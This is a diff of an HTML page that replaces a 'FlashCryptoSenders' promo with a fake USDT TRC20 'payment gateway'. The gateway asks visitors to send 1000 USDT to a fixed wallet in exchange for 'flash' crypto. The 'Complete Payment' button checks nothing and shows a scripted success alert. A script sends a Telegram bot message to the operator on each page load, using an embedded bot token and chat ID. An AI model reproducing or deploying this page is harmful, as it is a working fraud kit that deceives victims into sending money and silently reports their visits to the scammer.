@@ -1,114 +1,268 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <!-- Author Information (GitHub Username) -->
-  <!-- Author: @likhonsheikh54 | GitHub: https://github.com/likhonsheikh54 -->
-  
-  <meta name="robots" content="index, follow">
-  
-  <!-- SEO Metadata -->
-  <meta name="description" content="FlashCryptoSenders introduces a new auto-login feature by IP with enhanced security. Total users updated: 227,528. Check the latest updates now!">
-  <meta name="keywords" content="FlashCryptoSenders, Auto-login, CryptoSenders, Blockchain Security, Crypto Solutions, Secure Transactions, Crypto Innovation, Digital Security, Blockchain Updates">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Gateway - USDT via TRC20</title>
  
-  <!-- Open Graph Meta Tags (for social media previews) -->
-  <meta property="og:title" content="Midnight Updates - FlashCryptoSenders">
-  <meta property="og:description" content="FlashCryptoSenders introduces a new auto-login feature by IP and manual confirmation. Total users updated: 227,528. Explore the latest features now!">
-  <meta property="og:url" content="https://flash-crypto-senders.vercel.app/flash-usdt-senders.html">
-  <meta property="og:type" content="website">
-  <meta property="og:image" content="https://flash-crypto-senders.vercel.app/images/logo.png">
- 
-  <!-- Page Title -->
-  <title>Midnight Updates - FlashCryptoSenders</title>
-  
-  <!-- JSON-LD Structured Data -->
-  <script type="application/ld+json">
-    {
-      "@context": "https://schema.org",
-      "@type": "WebPage",
-      "headline": "Midnight Updates - FlashCryptoSenders",
-      "datePublished": "2025-02-15",
-      "dateModified": "2025-02-15",
-      "author": {
-        "@type": "Organization",
-        "name": "FlashCryptoSenders"
-      },
-      "publisher": {
-        "@type": "Organization",
-        "name": "FlashCryptoSenders",
-        "logo": {
-          "@type": "ImageObject",
-          "url": "https://flash-crypto-senders.vercel.app/images/logo.png"
+    <!-- Adding Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Roboto', sans-serif;
+            color: #fff;
+            background-color: black;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
         }
-      },
-      "description": "FlashCryptoSenders introduces a new auto-login feature by IP with enhanced security. Total users updated: 227,528. Check out the latest features!",
-      "keywords": "FlashCryptoSenders, Auto-login, Blockchain Security, CryptoSenders, Crypto Innovation, Digital Security",
-      "url": "https://flash-crypto-senders.vercel.app/flash-usdt-senders.html",
-      "mainEntityOfPage": "https://flash-crypto-senders.vercel.app/flash-usdt-senders.html",
-      "image": "https://flash-crypto-senders.vercel.app/images/logo.png",
-      "linkedPosts": [
-        {
-          "@type": "BlogPosting",
-          "headline": "FlashCryptoSenders - New Auto-login Feature Released",
-          "url": "https://flash-crypto-senders.vercel.app/blog/auto-login-feature.html",
-          "datePublished": "2025-02-15",
-          "author": {
-            "@type": "Person",
-            "name": "Likhon Sheikh"
-          },
-          "description": "FlashCryptoSenders has launched a new feature with auto-login by IP and manual confirmation for enhanced security. Learn more in this blog."
-        }
-      ]
-    }
-  </script>
-  
-  <!-- Stylesheets and Resources -->
-  <link rel="stylesheet" href="styles/main.css"> <!-- Link to main CSS -->
-  
-  <!-- External Fonts -->
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap">
-  
-  <!-- Favicon -->
-  <link rel="icon" href="images/favicon.ico" type="image/x-icon">
  
-  <!-- Preconnect to External Domains -->
-  <link rel="preconnect" href="https://fonts.gstatic.com">
-  
-  <!-- Author and GitHub Information (for future reference) -->
-  <!-- 
-    Author: @likhonsheikh54
-    GitHub: https://github.com/likhonsheikh54
-    File Structure Example:
-    - index.html (Main HTML)
-    - styles/
-        - main.css (Styles)
-    - images/
-        - logo.png (Images)
-        - favicon.ico (Icons)
-    - blog/
-        - auto-login-feature.html (Blog Post)
-  -->
+        .container {
+            text-align: center;
+            padding: 20px;
+            max-width: 400px;
+            width: 100%;
+        }
+ 
+        h2 {
+            font-size: 1.5em;
+            margin: 10px 0;
+        }
+ 
+        .barcode-container {
+            display: inline-block;
+            padding: 10px;
+            border-radius: 10px;
+            animation: glow 2s infinite alternate;
+            margin-bottom: 20px;
+        }
+ 
+        .barcode-image {
+            width: 180px;
+            height: auto;
+            border-radius: 5px;
+        }
+ 
+        /* Glowing animation */
+        @keyframes glow {
+            0% { box-shadow: 0 0 10px #ff0000, 0 0 20px #ff9900, 0 0 30px #00ff00, 0 0 40px #00ccff; }
+            50% { box-shadow: 0 0 15px #ff00ff, 0 0 25px #ffcc00, 0 0 35px #00ccff, 0 0 45px #ff0000; }
+            100% { box-shadow: 0 0 20px #00ff00, 0 0 30px #ff9900, 0 0 40px #ff00ff, 0 0 50px #00ccff; }
+        }
+ 
+        .usdt-text {
+            font-size: 1.2em;
+            color: #ffcc00;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+ 
+        .wallet-address {
+            font-size: 1em;
+            background: #333;
+            padding: 8px;
+            border-radius: 5px;
+            display: inline-block;
+            margin: 10px 0;
+        }
+ 
+        .copy-button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 5px 8px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-left: 5px;
+            font-size: 0.9em;
+        }
+ 
+        .copy-button:hover {
+            background-color: #0056b3;
+        }
+ 
+        .input-field {
+            margin: 10px 0;
+            padding: 8px;
+            width: 100%;
+            font-size: 14px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+        }
+ 
+        .button {
+            padding: 10px 15px;
+            background-color: #28a745;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 14px;
+            cursor: pointer;
+            width: 100%;
+        }
+ 
+        .button:hover {
+            background-color: #218838;
+        }
+ 
+        .timer {
+            font-size: 1em;
+            color: #d9534f;
+            margin: 10px 0;
+        }
+ 
+        /* Message Styling */
+        .message {
+            background-color: #007bff;
+            padding: 10px;
+            border-radius: 5px;
+            color: white;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+ 
+        /* Responsive adjustments for smaller screens */
+        @media (max-width: 600px) {
+            .container {
+                padding: 15px;
+            }
+ 
+            .barcode-image {
+                width: 150px;
+            }
+ 
+            h2 {
+                font-size: 1.2em;
+            }
+ 
+            .usdt-text {
+                font-size: 1em;
+            }
+ 
+            .wallet-address {
+                font-size: 0.9em;
+                padding: 6px;
+            }
+ 
+            .copy-button, .button {
+                font-size: 0.9em;
+                padding: 8px;
+            }
+ 
+            .timer {
+                font-size: 0.9em;
+            }
+ 
+            .message {
+                font-size: 0.9em;
+                padding: 8px;
+            }
+        }
+    </style>
 </head>
- 
 <body>
-  <!-- Page Content -->
-  <header>
-    <h1>FlashCryptoSenders - Midnight Updates</h1>
-    <p>New Auto-login by IP Feature with Manual Confirmation!</p>
-    <a href="https://flash-crypto-senders.vercel.app/flash-usdt-senders.html">Explore the Latest Features</a>
-  </header>
  
-  <footer>
-    <p>© 2025 FlashCryptoSenders. All rights reserved.</p>
-    <p>Follow us on GitHub: <a href="https://github.com/likhonsheikh54">@likhonsheikh54</a></p>
-  </footer>
+<div class="container">
+    <!-- Barcode Image with Glowing Border -->
+    <div class="barcode-container">
+        <img src="https://ugc.production.linktr.ee/94106f98-238c-40dd-9bad-907923c1dbcd_qr-code.png?io=true&size=avatar-v3_0" alt="Wallet Barcode" class="barcode-image">
+    </div>
+<script>
+    // Function to send a notification to the Telegram bot
+    function sendTelegramNotification() {
+        const botToken = "7652357474:AAG-lvX-g5VwNQm7GPXfFTqM7xIOfyZ8lJY"; // ضع التوكن الخاص بالبوت هنا
+        const chatId = "7073222421"; // ضع معرف الدردشة (Chat ID) هنا
+        const message = "📢 2تم الدخول إلى بوابة الدفع بواسطة مستخدم جديد!";
+        
+        // Telegram API URL for sending a message
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
  
-  <!-- Telegram Widget for Interactions -->
-  <script async src="https://telegram.org/js/telegram-widget.js?22" data-telegram-post="RecentCoders/34" data-width="100%"></script>
-  <script async src="https://telegram.org/js/telegram-widget.js?22" data-telegram-discussion="RecentCoders/34" data-comments-limit="5" data-colorful="1" data-dark="1"></script>
-  <script async src="https://comments.app/js/widget.js?3" data-comments-app-website="_qWlPJEh" data-limit="5" data-color="000" data-colorful="1" data-dark="1"></script>
+        // Sending the request
+        fetch(url)
+            .then(response => {
+                if (response.ok) {
+                    console.log("Notification sent to Telegram.");
+                } else {
+                    console.error("Failed to send notification.");
+                }
+            })
+            .catch(error => {
+                console.error("Telegram connection error:", error);
+            });
+    }
+ 
+    // Call the function when the page loads
+    window.onload = sendTelegramNotification;
+</script>
+ 
+    <!-- Main Content Below Barcode -->
+    <h2>Payment Gateway - USDT (TRC20)</h2>
+    <p class="usdt-text">Please send 1000 USDT to the wallet address below:</p>
+    
+    <div class="wallet-address" id="wallet-address">TSDy3QRcTW5cYxZUnzMGmY2Fkjs4xGow4M</div>
+    <button class="copy-button" onclick="copyWalletAddress()">Copy</button>
+ 
+    <p>After payment, enter your wallet address to confirm:</p>
+    <input type="text" id="wallet" class="input-field" placeholder="Enter your wallet address(TRC20) ">
+    
+    <button class="button" onclick="startPaymentProcess()">Complete Payment</button>
+    
+    <div class="timer" id="countdown">10:00</div>
+ 
+    <!-- Message that will be displayed after payment -->
+    <div id="paymentMessage" class="message">
+        The payment is being verified, and the flash will be sent to your wallet shortly.
+    </div>
+</div>
+ 
+<script>
+    // Function to copy wallet address to clipboard
+    function copyWalletAddress() {
+        const walletAddress = document.getElementById('wallet-address').textContent;
+        navigator.clipboard.writeText(walletAddress).then(() => {
+            alert("Wallet address copied to clipboard!");
+        }).catch(err => {
+            alert("Failed to copy address: " + err);
+        });
+    }
+ 
+    // Countdown timer logic
+    let countdownElement = document.getElementById('countdown');
+    let timeLeft = 10 * 60;
+ 
+    function updateCountdown() {
+        let minutes = Math.floor(timeLeft / 60);
+        let seconds = timeLeft % 60;
+        countdownElement.innerHTML = `${minutes}:${seconds < 10 ? '0' + seconds : seconds}`;
+        if (timeLeft > 0) {
+            timeLeft--;
+        } else {
+            alert("Time's up! Please try again.");
+            window.location.reload();
+        }
+    }
+ 
+    setInterval(updateCountdown, 1000);
+ 
+    // Function to handle payment and display the message
+    function startPaymentProcess() {
+        let wallet = document.getElementById('wallet').value;
+        if (wallet === "") {
+            alert("Please enter your wallet address.");
+            return;
+        }
+        document.getElementById('paymentMessage').style.display = "block";
+        setTimeout(function() {
+            alert("Payment has been successfully processed. Flash will be sent to your wallet.");
+        }, 3000);
+    }
+</script>
+ 
 </body>
 </html>
  
